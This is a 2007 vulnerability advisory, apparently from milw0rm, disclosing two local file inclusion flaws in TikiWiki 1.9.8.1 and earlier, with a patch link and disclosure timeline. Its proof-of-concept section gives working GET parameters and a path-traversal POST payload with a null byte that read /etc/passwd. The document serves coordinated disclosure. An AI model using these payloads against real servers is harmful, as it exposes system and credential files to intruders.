@@ -1,0 +1,63 @@
+======================================================================
+TikiWiki <= 1.9.8.1 Local File Inclusion
+======================================================================
+
+Author:          L4teral <l4teral [4t] gmail com>
+Impact:          Local File Inclusion
+Status:          patch available
+
+
+------------------------------
+Affected software description:
+------------------------------
+
+Application:     TikiWiki
+Version:         <= 1.9.8.1
+Vendor:          http://tikiwiki.org
+
+Description:
+TikiWiki (Tiki) is your Groupware/CMS (Content Management System) solution.
+
+
+--------------
+Vulnerability:
+--------------
+
+1.
+The script db/tiki-db.php is vulnerable to local file inclusion attacks.
+
+2.
+The script tiki-imexport_languages.php is vulnerable to local file inclusion attacks.
+
+
+------------
+PoC/Exploit:
+------------
+
+1.
+register_globals required:
+http://localhost/tikiwiki/tiki-index.php?error_handler_file=/etc/passwd
+http://localhost/tikiwiki/tiki-index.php?local_php=/etc/passwd
+
+2.
+feature lang_use_db(use database for translation) must be activated:
+URL: http://localhost/tikiwiki/tiki-imexport_languages.php
+POSTDATA: imp_language=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&import=import
+
+
+---------
+Solution:
+---------
+
+update to 1.9.8.2 or above:
+https://sourceforge.net/project/showfiles.php?group_id=64258&package_id=112134&release_id=549549
+
+---------
+Timeline:
+---------
+
+23.10.2007 - vendor informed
+25.10.2007 - vendor released patch
+25.10.2007 - public disclosure
+
+# milw0rm.com [2007-10-25]
